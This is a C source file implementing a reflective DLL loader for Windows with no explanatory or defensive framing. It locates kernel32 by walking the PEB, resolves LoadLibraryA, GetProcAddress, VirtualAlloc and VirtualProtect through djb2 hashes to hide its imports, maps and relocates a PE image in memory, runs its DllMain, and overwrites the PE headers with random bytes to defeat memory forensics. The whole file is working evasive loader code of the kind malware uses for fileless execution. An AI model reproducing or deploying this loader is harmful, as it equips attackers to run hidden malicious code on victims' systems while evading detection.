#include "rdi.h"
#include <winternl.h>

typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
typedef HMODULE (WINAPI *LoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *GetProcAddress_t)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);

static void apply_relocations(PBYTE base, PIMAGE_NT_HEADERS nt, ULONG_PTR delta) {
    if (delta == 0) return;

    PIMAGE_DATA_DIRECTORY reloc_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (reloc_dir->Size == 0) return;

    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(base + reloc_dir->VirtualAddress);
    while (reloc->VirtualAddress) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PWORD entries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < count; i++) {
            WORD type = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                PULONG_PTR patch = (PULONG_PTR)(base + reloc->VirtualAddress + offset);
                *patch += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                PDWORD patch = (PDWORD)(base + reloc->VirtualAddress + offset);
                *patch += (DWORD)delta;
            }
        }
        reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
    }
}

static BOOL resolve_imports(PBYTE base, PIMAGE_NT_HEADERS nt,
                            LoadLibraryA_t pLoadLibrary, GetProcAddress_t pGetProcAddress) {
    PIMAGE_DATA_DIRECTORY import_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir->Size == 0) return TRUE;

    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(base + import_dir->VirtualAddress);
    for (; imp->Name; imp++) {
        const char* dll_name = (const char*)(base + imp->Name);
        HMODULE dll = pLoadLibrary(dll_name);
        if (!dll) return FALSE;

        PIMAGE_THUNK_DATA orig = (PIMAGE_THUNK_DATA)(base + (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(base + imp->FirstThunk);

        for (; orig->u1.AddressOfData; orig++, thunk++) {
            FARPROC func;
            if (IMAGE_SNAP_BY_ORDINAL(orig->u1.Ordinal)) {
                func = pGetProcAddress(dll, (LPCSTR)IMAGE_ORDINAL(orig->u1.Ordinal));
            } else {
                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)(base + orig->u1.AddressOfData);
                func = pGetProcAddress(dll, by_name->Name);
            }
            if (!func) return FALSE;
            thunk->u1.Function = (ULONG_PTR)func;
        }
    }
    return TRUE;
}

static void set_section_protections(PBYTE base, PIMAGE_NT_HEADERS nt, VirtualProtect_t pVirtualProtect) {
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        DWORD prot = PAGE_READONLY;
        DWORD chars = section->Characteristics;
        if (chars & IMAGE_SCN_MEM_EXECUTE)
            prot = (chars & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        else if (chars & IMAGE_SCN_MEM_WRITE)
            prot = PAGE_READWRITE;

        DWORD old;
        pVirtualProtect(base + section->VirtualAddress, section->Misc.VirtualSize, prot, &old);
    }
}

PVOID reflective_load(PBYTE raw_pe, DWORD pe_size) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)raw_pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(raw_pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    // Resolve kernel32 functions from PEB
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;
    HMODULE kernel32 = NULL;

    while (curr != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->FullDllName.Buffer) {
            PWCHAR name = entry->FullDllName.Buffer;
            DWORD len = entry->FullDllName.Length / sizeof(WCHAR);
            for (DWORD j = 0; j + 7 < len; j++) {
                if ((name[j] == L'k' || name[j] == L'K') &&
                    (name[j+1] == L'e' || name[j+1] == L'E') &&
                    (name[j+2] == L'r' || name[j+2] == L'R') &&
                    (name[j+3] == L'n' || name[j+3] == L'N') &&
                    (name[j+4] == L'e' || name[j+4] == L'E') &&
                    (name[j+5] == L'l' || name[j+5] == L'L') &&
                    (name[j+6] == L'3' ) &&
                    (name[j+7] == L'2' )) {
                    kernel32 = (HMODULE)entry->DllBase;
                    goto found_k32;
                }
            }
        }
        curr = curr->Flink;
    }
    return NULL;

found_k32:;
    // Get exports from kernel32 by walking its export table
    PIMAGE_DOS_HEADER k32_dos = (PIMAGE_DOS_HEADER)kernel32;
    PIMAGE_NT_HEADERS k32_nt = (PIMAGE_NT_HEADERS)((PBYTE)kernel32 + k32_dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY k32_exp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)kernel32 +
        k32_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD k32_names = (PDWORD)((PBYTE)kernel32 + k32_exp->AddressOfNames);
    PDWORD k32_funcs = (PDWORD)((PBYTE)kernel32 + k32_exp->AddressOfFunctions);
    PWORD  k32_ords  = (PWORD)((PBYTE)kernel32 + k32_exp->AddressOfNameOrdinals);

    LoadLibraryA_t pLoadLibrary = NULL;
    GetProcAddress_t pGetProcAddress = NULL;
    VirtualAlloc_t pVirtualAlloc = NULL;
    VirtualProtect_t pVirtualProtect = NULL;

    // Resolve by djb2 hash
    #define H_LoadLibraryA   0x5FBFF0FB
    #define H_GetProcAddress 0xCF31BB1F
    #define H_VirtualAlloc   0x382C0F97
    #define H_VirtualProtect 0x844FF18D

    for (DWORD i = 0; i < k32_exp->NumberOfNames; i++) {
        const char* fn = (const char*)((PBYTE)kernel32 + k32_names[i]);
        DWORD h = 5381;
        const char* p = fn;
        while (*p) { h = ((h << 5) + h) + (unsigned char)*p++; }

        PVOID addr = (PVOID)((PBYTE)kernel32 + k32_funcs[k32_ords[i]]);
        if (h == H_LoadLibraryA)    pLoadLibrary = (LoadLibraryA_t)addr;
        else if (h == H_GetProcAddress) pGetProcAddress = (GetProcAddress_t)addr;
        else if (h == H_VirtualAlloc)   pVirtualAlloc = (VirtualAlloc_t)addr;
        else if (h == H_VirtualProtect) pVirtualProtect = (VirtualProtect_t)addr;
    }

    if (!pLoadLibrary || !pGetProcAddress || !pVirtualAlloc || !pVirtualProtect)
        return NULL;

    // Allocate memory for the image
    DWORD image_size = nt->OptionalHeader.SizeOfImage;
    PBYTE base = (PBYTE)pVirtualAlloc(NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) return NULL;

    // Copy headers
    memcpy(base, raw_pe, nt->OptionalHeader.SizeOfHeaders);

    // Copy sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        if (section->SizeOfRawData > 0) {
            memcpy(base + section->VirtualAddress,
                   raw_pe + section->PointerToRawData,
                   section->SizeOfRawData);
        }
    }

    // Re-parse NT headers from new base
    PIMAGE_NT_HEADERS new_nt = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    ULONG_PTR delta = (ULONG_PTR)base - new_nt->OptionalHeader.ImageBase;

    apply_relocations(base, new_nt, delta);

    if (!resolve_imports(base, new_nt, pLoadLibrary, pGetProcAddress))
        return NULL;

    set_section_protections(base, new_nt, pVirtualProtect);

    // Call DllMain
    DllMain_t entry = (DllMain_t)(base + new_nt->OptionalHeader.AddressOfEntryPoint);
    entry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);

    return base;
}

void wipe_pe_headers(PVOID base) {
    DWORD old;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
    DWORD header_size = nt->OptionalHeader.SizeOfHeaders;

    VirtualProtect(base, header_size, PAGE_READWRITE, &old);

    // Overwrite with pseudo-random data
    PBYTE p = (PBYTE)base;
    DWORD seed = GetTickCount();
    for (DWORD i = 0; i < header_size; i++) {
        seed = seed * 1103515245 + 12345;
        p[i] = (BYTE)(seed >> 16);
    }

    VirtualProtect(base, header_size, PAGE_READONLY, &old);
}
